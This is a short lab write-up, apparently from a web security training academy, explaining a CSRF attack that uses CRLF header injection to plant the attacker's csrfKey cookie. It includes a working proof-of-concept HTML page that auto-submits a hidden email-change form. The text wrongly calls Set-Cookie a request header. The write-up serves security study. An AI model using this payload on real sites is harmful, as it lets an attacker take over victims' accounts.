 `Set-Cookie` is a HTTP Request Header which can store your cookie on your machine. This cookie will send automatically in the next request to the same domain, which can keep your session or store user info. In this payload, we use an `<img>` tag which access to a non-existing page (cotain in `search` parameter), then we inject `Set-Cookie` header with attacker's `csrfKey`value, once `onerror` action is triggered, the form which contains attacker's email and CSRF token will be sent, with the Cookie values were set by `Set-Cookie` header before. We need to set `SameSite=None` in `Set-Cookie` header to send request from cross-site domain, `SameSite` is a mechanism which preventing CSRF attack when we set it to `Strict` or `Lax`.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6b00f90354f143800f679000e90074.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker_lorddd@gmail.com" />
      <input type="hidden" name="csrf" value="NQnOZQs6Lt8QEYoi9dtiDUmkaWQEnCaz" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a6b00f90354f143800f679000e90074.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=vWAKZgCXhyKrYD1X8qsW7P4ovUZvFXe7%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```